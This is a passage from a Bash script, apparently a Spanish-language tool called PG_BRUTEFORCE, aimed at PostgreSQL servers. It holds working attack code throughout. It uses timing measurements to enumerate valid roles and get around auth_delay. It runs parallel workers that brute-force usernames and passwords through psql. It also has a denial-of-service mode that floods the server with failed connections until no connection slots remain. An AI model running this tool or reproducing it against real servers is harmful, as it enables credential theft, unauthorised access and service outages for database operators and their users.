    elif [ "$FAKE_HIGH" = "1" ] && [ "$TARGET_HIGH" = "1" ]; then
        # ── GLOBAL: auth_delay aplica a TODOS los intentos fallidos
        # Tanto T_FAKE como T_TARGET son ~delay_time
        # CLAVE: T_FAKE ES el tiempo real de delay (medido con MEASURE_TIMEOUT=60s)
        # El suggested timeout debe ser T_FAKE + margen, no T_TARGET + 1
        echo -e "${YELLOW}${BOLD}[!] DELAY GLOBAL${NC}"
        echo -e "${YELLOW}    auth_delay aplica a TODOS los intentos fallidos (incluyendo${NC}"
        echo -e "${YELLOW}    usuarios inexistentes). No se puede enumerar por timing.${NC}"
        echo -e "${YELLOW}    El delay medido es: ${WHITE}~${T_FAKE}s${NC}"
        DELAY_TIPO="global"
        # Suggested = latencia TCP + 0.5s de margen (suficiente para recibir respuesta de red)
        SUGGESTED_T=$(echo "scale=2; $T_TCP + 0.5" | bc)
        SUGGESTED_T_BYPASS="N/A (delay global — bypass por timing no posible)"

    else
        # ── NINGUNO: servidor sin delay
        echo -e "${GREEN}${BOLD}[✔] SIN DELAY — Servidor rápido.${NC}"
        echo -e "${GREEN}    No hay throttling. Blanco ideal para ataque directo.${NC}"
        DELAY_TIPO="ninguno"
        SUGGESTED_T=$(echo "scale=2; $T_TCP + 0.5" | bc)
        SUGGESTED_T_BYPASS="N/A"
        local NEG_DIFF; NEG_DIFF=$(echo "$DIFF < 0" | bc -l 2>/dev/null)
        [ "$NEG_DIFF" = "1" ] && \
            echo -e "${YELLOW}    Varianza de red detectada. Considera -n 10 para mayor precisión.${NC}"
    fi

    # ── Recomendaciones ─────────────────────────────────────────────────────
    echo -e "\n${YELLOW}${BOLD}[VALORES CALCULADOS]:${NC}"
    printf "  ${WHITE}%-38s${GREEN}%s${NC}\n" "Timeout para ataques (-T):"    "${SUGGESTED_T}s"
    if [ "$DELAY_TIPO" = "selectivo" ] && [[ "$SUGGESTED_T_BYPASS" != "N/A"* ]]; then
        printf "  ${WHITE}%-38s${CYAN}%s${NC}\n" "Timeout para bypass de delay:" "${SUGGESTED_T_BYPASS}s"
    fi
    echo ""
    echo -e "${YELLOW}${BOLD}[RECOMENDACIONES]:${NC}"
    if [ "$HBA_TODOS" = true ]; then
        echo -e "  ${RED}⚠  Enumeración inútil (pg_hba USER=all). Ataca contraseñas directamente:${NC}"
        echo -e "     ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -T $SUGGESTED_T -w 8${NC}"
    else
        if [ "$DELAY_TIPO" = "selectivo" ] && [[ "$SUGGESTED_T_BYPASS" != "N/A"* ]]; then
            echo -e "  → Bypass delay (reales → [!] TIMEOUT, ficticios → [X] rápido):"
            echo -e "     ${CYAN}$0 -h $HOST -p $PORT -u <users.txt> -T $SUGGESTED_T_BYPASS -w 16 -q${NC}"
        fi
        echo -e "  → Ataque de contraseñas con timeout calibrado:"
        echo -e "     ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -T $SUGGESTED_T -w 8${NC}"
    fi
    echo -e "  ${DIM}(Sin -T explícito, los próximos comandos usarán ${SUGGESTED_T}s desde la sesión)${NC}"

    # ── Análisis de lista de usuarios si se combinó con -u ──────────────────
    if [[ -n "$USER_FILE" ]] && [[ -f "$USER_FILE" ]]; then
        echo -e "\n${CYAN}${BOLD}═══════════ ANÁLISIS TIMING — LISTA DE USUARIOS ═══════════${NC}"
        if [ "$HBA_TODOS" = true ]; then
            echo -e "${RED}  ⚠  Omitido: pg_hba USER=all — todos generan el mismo tiempo.${NC}"
        elif [ "$DELAY_TIPO" = "global" ]; then
            echo -e "${YELLOW}  ⚠  Delay global: el tiempo no distingue usuarios. Omitido.${NC}"
        else
            echo -e "${WHITE}[*] Ref ficticioso: ${CYAN}${T_FAKE}s${WHITE} | Umbral: ${CYAN}${TIMING_THRESHOLD}s${NC}\n"
            local count_valid=0 count_total=0
            while IFS= read -r username; do
                [[ -z "$username" || "$username" =~ ^# ]] && continue
                count_total=$((count_total + 1))
                local T_USR DIFF_USR SIG
                T_USR=$(medir_tiempo_respuesta "$username" "$FAKE_PASS" "$MEASURE_TIMEOUT" 1)
                DIFF_USR=$(echo "scale=4; $T_USR - $T_FAKE" | bc)
                SIG=$(echo "$DIFF_USR > $TIMING_THRESHOLD" | bc -l 2>/dev/null)
                if [ "$SIG" = "1" ]; then
                    count_valid=$((count_valid + 1))
                    echo -e "${GREEN}[->] POSIBLE VÁLIDO: '${username}' (${T_USR}s vs ${T_FAKE}s, Δ${DIFF_USR}s)${NC}"
                    [[ -n "$OUTPUT_FILE" ]] && \
                        (flock -x 201; echo "[$(date +'%Y-%m-%d %H:%M:%S')] [TIMING-VALID] Usuario: '$username' T=${T_USR}s Delta=${DIFF_USR}s" >> "$OUTPUT_FILE") 201>"$OUT_LOCK"
                else
                    [ "$QUIET_MODE" = false ] && echo -e "${RED}[X]  '${username}' (${T_USR}s, Δ${DIFF_USR}s)${NC}"
                fi
            done < "$USER_FILE"
            echo -e "\n${WHITE}${BOLD}[RESUMEN] Analizados: ${count_total} | Posibles válidos: ${count_valid}${NC}"
        fi
    fi

    [[ -n "$OUTPUT_FILE" ]] && \
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] [ANALYZE] Host=$HOST:$PORT T_TCP=${T_TCP}s T_FAKE=${T_FAKE}s T_TARGET=${T_TARGET}s DIFF=${DIFF}s DelayTipo=${DELAY_TIPO} HBA_Todos=${HBA_TODOS} SuggestedT=${SUGGESTED_T}s MeasureTimeout=${MEASURE_TIMEOUT}s" >> "$OUTPUT_FILE"

    echo -e "\n${CYAN}${BOLD}═══════════════════ GUARDANDO SESIÓN ═══════════════════${NC}"
    guardar_sesion "$SUGGESTED_T" "$HBA_TODOS" "$DELAY_TIPO"
    echo -e "\n${CYAN}${BOLD}════════════════════ FIN DEL ANÁLISIS ════════════════════${NC}\n"
}

# =============================================================================
# MODO DoS — INUNDACIÓN DE CONEXIONES
# =============================================================================

# Verifica si el servicio PostgreSQL responde y en qué estado está.
# Retorna: "ACTIVO" | "SATURADO" | "CAIDO"
verificar_servicio_dos() {
    if ! timeout 1s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null; then
        echo "CAIDO"; return
    fi
    local RES
    RES=$(PGPASSWORD="x" timeout 1s psql         -h "$HOST" -p "$PORT" -d "$DB" -U "probe_$RANDOM$RANDOM" -c "" 2>&1)
    if   [[ "$RES" == *"too many clients"* ]] ||          [[ "$RES" == *"remaining connection slots"* ]]; then echo "SATURADO"
    elif [[ "$RES" == *"Connection refused"* ]] ||          [[ "$RES" == *"could not connect"* ]];            then echo "CAIDO"
    else                                                        echo "ACTIVO"
    fi
}

# Worker DoS: hace conexiones fallidas continuamente y registra el conteo.
dos_worker() {
    local worker_id="$1"
    local worker_sleep="$2"
    local count_file="$TEMP_DIR/dos_w_${worker_id}"
    local sat_file="$TEMP_DIR/dos_s_${worker_id}"
    local count=0 sat=0
    echo "0" > "$count_file"
    echo "0" > "$sat_file"

    while [ ! -f "$TEMP_DIR/dos_stop" ]; do
        local RES
        RES=$(PGPASSWORD="x" timeout 1s psql             -h "$HOST" -p "$PORT" -d "$DB"             -U "dos_${RANDOM}${RANDOM}" -c "" 2>&1) || true
        count=$((count + 1))
        echo "$count" > "$count_file"
        if [[ "$RES" == *"too many clients"* ]] ||            [[ "$RES" == *"remaining connection slots"* ]]; then
            sat=$((sat + 1))
            echo "$sat" > "$sat_file"
        fi
        [ "$worker_sleep" != "0" ] && sleep "$worker_sleep" 2>/dev/null
    done
}

# Dibuja el panel DoS en pantalla. En la primera llamada imprime normalmente;
# en las siguientes sube el cursor y sobreescribe sin saturar la terminal.
DISPLAY_LINES_DOS=8
mostrar_dos_display() {
    local total="$1" sat="$2" tasa="$3" workers="$4" target="$5"
    local estado="$6" timestamp="$7" primera="$8"

    [ "$primera" = false ] && printf '[%dA[J' "$DISPLAY_LINES_DOS"

    # Barra de progreso (44 columnas)
    local bar_width=44 filled=0 empty=44
    if [ "$target" -gt 0 ] && [ "$total" -gt 0 ]; then
        filled=$(( total * bar_width / target ))
        [ "$filled" -gt "$bar_width" ] && filled=$bar_width
        empty=$(( bar_width - filled ))
    fi
    local bar="" i
    for ((i=0; i<filled; i++)); do bar+="█"; done
    for ((i=0; i<empty; i++)); do bar+="░"; done

    # Color y etiqueta de estado
    local sc est_txt
    case "$estado" in
        ACTIVO)   sc="$GREEN";  est_txt="● ACTIVO" ;;
        SATURADO) sc="$YELLOW"; est_txt="● SATURADO — max_connections alcanzado" ;;
        CAIDO)    sc="$RED";    est_txt="● CAÍDO — servicio sin respuesta" ;;
        *)        sc="$YELLOW"; est_txt="● DESCONOCIDO" ;;
    esac

    # Color de barra: amarillo normal, rojo cuando supera el objetivo
    local bar_color="$YELLOW"
    [ "$total" -ge "$target" ] && bar_color="$RED"

    local sep="${CYAN}─────────────────────────────────────────────────────${NC}"
    echo -e "$sep"
    echo -e "  ${RED}${BOLD}⚡ DoS${NC}  ${WHITE}${HOST}:${PORT}${NC}   ${DIM}Workers: ${workers}   Objetivo: ${target} conex.${NC}"
    echo -e "$sep"
    printf "  ${WHITE}Enviadas  :${NC} %-10s   ${WHITE}Tasa   :${NC} ${YELLOW}%s req/s${NC}
" "$total" "$tasa"
    printf "  ${WHITE}Saturadas :${NC} %-10s   ${WHITE}Estado :${NC} ${sc}%s${NC}
" "$sat" "$est_txt"
    echo -e "  [${bar_color}${bar}${NC}] ${WHITE}${total}${NC}/${WHITE}${target}${NC}"
    echo -e "  ${DIM}Actualizado: ${timestamp}${NC}"
    echo -e "$sep"
}

modo_dos() {
    local workers=$WORKERS
    local rate=$DOS_RATE
    local target=$DOS_MAX_TARGET

    # Calcular sleep entre conexiones por worker para respetar la tasa objetivo
    local worker_sleep="0"
    if [ "$rate" -gt 0 ] && [ "$workers" -gt 0 ]; then
        worker_sleep=$(echo "scale=4; $workers / $rate" | bc 2>/dev/null)
        local tiny; tiny=$(echo "$worker_sleep < 0.01" | bc -l 2>/dev/null)
        [ "$tiny" = "1" ] && worker_sleep="0"
    fi

    echo -e "${RED}${BOLD}
  [!] Iniciando modo DoS contra ${HOST}:${PORT}${NC}"
    echo -e "  ${WHITE}Workers: ${workers} | Tasa objetivo: ${rate}/s | Objetivo: ${target} conexiones${NC}"
    echo -e "  ${DIM}Presiona Ctrl+C para detener${NC}
"
    sleep 1

    printf '[?25l'   # ocultar cursor

    # Trap local para DoS: limpia y muestra cursor al salir
    trap '
        touch "$TEMP_DIR/dos_stop" 2>/dev/null
        sleep 0.3
        jobs -p 2>/dev/null | xargs -r kill 2>/dev/null
        wait 2>/dev/null
        printf "[?25h"
        printf "
"
        echo -e "
${YELLOW}[*] Ataque DoS detenido. Workers finalizados.${NC}"
        exit 0
    ' INT TERM

    # Lanzar workers en background
    local i
    for ((i=0; i<workers; i++)); do
        dos_worker "$i" "$worker_sleep" &
    done

    # Bucle de display — actualiza cada segundo, no satura la terminal
    local primera=true prev_total=0

    while true; do
        local total=0 sat=0 j
        for ((j=0; j<workers; j++)); do
            local wc sc
            wc=$(cat "$TEMP_DIR/dos_w_${j}" 2>/dev/null || echo 0)
            sc=$(cat "$TEMP_DIR/dos_s_${j}" 2>/dev/null || echo 0)
            total=$((total + wc))
            sat=$((sat + sc))
        done

        local tasa=$(( total - prev_total ))
        prev_total=$total
        local estado; estado=$(verificar_servicio_dos)
        local timestamp; timestamp=$(date +'%Y-%m-%d %H:%M:%S')

        mostrar_dos_display "$total" "$sat" "$tasa" "$workers" "$target"                             "$estado" "$timestamp" "$primera"
        primera=false
        sleep 1
    done
}

# =============================================================================
# WORKERS — sin límite máximo
# La distribución modular con awk garantiza que todos los workers reciban
# trabajo equitativo. Si workers > entradas, los workers "vacíos" terminan
# inmediatamente sin consumir recursos.
# =============================================================================

worker_usuarios() {
    local worker_id="$1" total_workers="$2"
    awk -v w="$worker_id" -v n="$total_workers" \
        'NR % n == w % n && length($0) > 0 && !/^#/' "$USER_FILE" | \
    while IFS= read -r username; do
        [ -f "$SUCCESS_FLAG" ] && return 0
        local t_start t_end duration RES status
        t_start=$(date +%s%N)
        RES=$(PGPASSWORD="$PASS_DEFAULT" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$username" -c "SELECT 1" 2>&1)
        status=$?; t_end=$(date +%s%N)
        duration=$(echo "scale=3; ($t_end - $t_start) / 1000000000" | bc)
        [ -f "$SUCCESS_FLAG" ] && return 0
        if   [ "$status" -eq 124 ]; then
            log_msg "TIMEOUT" "Timeout (>${CLI_TIMEOUT}s) → Posible usuario válido: '${username}'" "$YELLOW" "[!]" "$duration"
        elif [[ "$RES" == *"password authentication failed"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: '${username}' (requiere contraseña)" "$GREEN" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"SELECT 1"* ]]; then
            log_msg "SUCCESS" "¡ACCESO DIRECTO! Usuario '${username}' sin contraseña" "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: '${username}' (DB '$DB' no existe pero el rol sí)" "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"no pg_hba.conf entry"* ]]; then
            log_msg "DENIED"  "Usuario '${username}' denegado por pg_hba.conf" "$RED" "[X]" "$duration"
        elif [[ "$RES" == *"role \"$username\" does not exist"* ]]; then
            log_msg "INFO"    "Usuario '${username}' no existe." "$RED" "[X]" "$duration"
        elif [[ "$RES" == *"Connection refused"* ]] || [[ "$RES" == *"could not connect"* ]]; then
            log_msg "ERROR"   "Error de conexión para '${username}': $(echo "$RES" | head -1)" "$RED" "[!!]" "$duration"
        else
            log_msg "UNKNOWN" "Respuesta inesperada para '${username}': $(echo "$RES" | head -1)" "$YELLOW" "[?]" "$duration"
        fi
    done
}

worker_passwords() {
    local worker_id="$1" total_workers="$2"
    awk -v w="$worker_id" -v n="$total_workers" \
        'NR % n == w % n && length($0) > 0 && !/^#/' "$PASS_FILE" | \
    while IFS= read -r password; do
        [ -f "$SUCCESS_FLAG" ] && return 0
        local t_start t_end duration RES status
        t_start=$(date +%s%N)
        RES=$(PGPASSWORD="$password" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$USER_DEFAULT" -c "SELECT 1" 2>&1)
        status=$?; t_end=$(date +%s%N)
        duration=$(echo "scale=3; ($t_end - $t_start) / 1000000000" | bc)
        [ -f "$SUCCESS_FLAG" ] && return 0
        if   [ "$status" -eq 124 ]; then
            log_msg "TIMEOUT" "Timeout (>${CLI_TIMEOUT}s) con pass: '${password}'" "$YELLOW" "[!]" "$duration"
        elif [ "$status" -eq 0 ]; then
            log_msg "SUCCESS" "¡CONTRASEÑA ENCONTRADA! → ${USER_DEFAULT}:${password}" "$GREEN" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; return 0
        elif [[ "$RES" == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Contraseña válida: '${password}' (DB '$DB' no existe, pero auth pasó)" "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"; return 0
        else
            log_msg "FAIL" "Fallido: ${password}" "$RED" "[X]" "$duration"
        fi
    done
}

lanzar_workers() {
    local mode="$1" input_file total_lines
    [ "$mode" = "users" ] && input_file="$USER_FILE" || input_file="$PASS_FILE"
    total_lines=$(grep -c -v '^#\|^[[:space:]]*$' "$input_file" 2>/dev/null || wc -l < "$input_file")

    # Sin límite de workers — la distribución modular de awk maneja cualquier cantidad.
    # Workers > entradas simplemente reciben 0 líneas y terminan de inmediato.
    local effective_workers=$WORKERS

    [ "$QUIET_MODE" = false ] && {
        local attack_label
        [ "$mode" = "users" ] && attack_label="Enumeración de usuarios" \
                               || attack_label="Fuerza bruta → ${USER_DEFAULT}"
        echo -e "${CYAN}[!] ${attack_label}${NC}"
        echo -e "${CYAN}    Lista: ${WHITE}${input_file}${CYAN} | Entradas: ${WHITE}${total_lines}${CYAN} | Workers: ${WHITE}${effective_workers}${CYAN} | Timeout: ${WHITE}${CLI_TIMEOUT}s${NC}"
        echo -e "${DIM}─────────────────────────────────────────────────────${NC}"
    }

    local pids=()
    for ((i = 0; i < effective_workers; i++)); do
        if [ "$mode" = "users" ]; then worker_usuarios "$i" "$effective_workers" &
        else worker_passwords "$i" "$effective_workers" &
        fi
        pids+=($!)
    done
    for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done

    [ -f "$SUCCESS_FLAG" ] && [ "$EXIT_ON_SUCCESS" = true ] && [ "$QUIET_MODE" = false ] && \
        echo -e "\n${GREEN}[*] Objetivo alcanzado. Workers finalizados.${NC}"
}

# =============================================================================
# MAIN
# =============================================================================

[ "$QUIET_MODE" = false ] && mostrar_banner
verificar_dependencias
[ "$SKIP_PORT_CHECK" = false ] && validar_puerto

# ── Cargar sesión previa (si existe en /tmp para este host:port:db) ──────────
SESSION_LOADED=false
if cargar_sesion; then
    SESSION_LOADED=true
    if [ "$CLI_TIMEOUT_EXPLICIT" = false ] && [[ -n "$SESSION_SUGGESTED_TIMEOUT" ]]; then
        CLI_TIMEOUT="$SESSION_SUGGESTED_TIMEOUT"
    fi
    [ "$QUIET_MODE" = false ] && mostrar_sesion_cargada
fi

[[ -n "$OUTPUT_FILE" ]] && \
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [START] PG_BRUTEFORCE v${VERSION} | Host: $HOST:$PORT | DB: $DB | Workers: $WORKERS | Timeout: ${CLI_TIMEOUT}s | SessionLoaded: $SESSION_LOADED" >> "$OUTPUT_FILE"

# ── Modo DoS ─────────────────────────────────────────────────────────────────
if [ "$DOS_MODE" = true ]; then
    modo_dos
    exit 0
fi

# ── Modo Análisis ─────────────────────────────────────────────────────────────
if [ "$ANALYZE_MODE" = true ]; then
    modo_analisis; exit 0
fi

# ── Enumeración de usuarios ───────────────────────────────────────────────────
if [[ -n "$USER_FILE" ]]; then
    [[ ! -f "$USER_FILE" ]] && { echo -e "${RED}[ERROR] Archivo no encontrado: $USER_FILE${NC}"; exit 1; }

    # Guardia pg_hba — usa sesión si la hay, sino hace pre-check en vivo
    if [ "$SESSION_LOADED" = true ] && [ "$SESSION_HBA_ACEPTA_TODOS" = "true" ]; then
        echo -e "${CYAN}[*] Sesión indica que pg_hba acepta TODOS los usuarios.${NC}"
        advertencia_hba_acepta_todos "abort" "pgbf_probe_*** (sesión previa -A)"
        exit 1
    else
        if [ "$SESSION_LOADED" = false ]; then
            [ "$QUIET_MODE" = false ] && \
                echo -ne "${CYAN}[*] Pre-check pg_hba (sin sesión): sondeo con usuario ficticio ... ${NC}"
        else
            [ "$QUIET_MODE" = false ] && \
                echo -ne "${CYAN}[*] Pre-check pg_hba: verificando configuración actual ... ${NC}"
        fi

        # Usamos PROBE_TIMEOUT (20s) para el pre-check en modo ataque —
        # suficiente para la mayoría de configuraciones de auth_delay.
        verificar_hba_acepta_todos "$PROBE_TIMEOUT"; HBA_RESULT=$?
        case $HBA_RESULT in
            0)
                [ "$QUIET_MODE" = false ] && echo -e "${RED}¡ADVERTENCIA!${NC}"
                advertencia_hba_acepta_todos "abort" "$(generar_usuario_falso)"
                exit 1 ;;
            1)
                [ "$QUIET_MODE" = false ] && echo -e "${GREEN}OK (pg_hba selectivo)${NC}" ;;
            2)
                [ "$QUIET_MODE" = false ] && {
                    echo -e "${YELLOW}INDETERMINADO${NC}"
                    echo -e "${YELLOW}[!] El probe tardó más de ${PROBE_TIMEOUT}s — posible auth_delay alto.${NC}"
                    echo -e "${YELLOW}    Considera correr -A primero para calibrar el timeout.${NC}"
                } ;;
        esac
    fi

    lanzar_workers "users"
    [ "$QUIET_MODE" = false ] && echo -e "\n${CYAN}[*] Enumeración completada.${NC}"

# ── Fuerza bruta de contraseñas ───────────────────────────────────────────────
elif [[ -n "$PASS_FILE" ]]; then
    [[ ! -f "$PASS_FILE" ]] && { echo -e "${RED}[ERROR] Archivo no encontrado: $PASS_FILE${NC}"; exit 1; }
    lanzar_workers "passwords"
    [ "$QUIET_MODE" = false ] && echo -e "\n${CYAN}[*] Fuerza bruta completada.${NC}"

else
    mostrar_ayuda
fi

[[ -n "$OUTPUT_FILE" ]] && \
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [END] Proceso finalizado." >> "$OUTPUT_FILE"
